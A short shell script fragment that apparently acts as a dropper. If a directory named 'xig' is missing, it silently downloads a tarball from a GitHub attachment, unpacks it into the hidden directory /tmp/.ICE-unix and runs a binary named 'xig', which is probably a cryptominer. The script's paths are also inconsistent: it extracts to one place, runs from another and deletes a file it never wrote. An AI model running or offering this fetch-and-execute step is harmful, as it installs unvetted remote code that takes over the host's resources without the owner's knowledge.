if [ ! -d xig ];then
     wget -q https://github.com/testuser1s/k/files/1877782/xig.tar.gz -O - |tar zxf - -C /tmp/.ICE-unix
     rm -f xig.tar.gz
	 cd xig
	 ./xig
fi

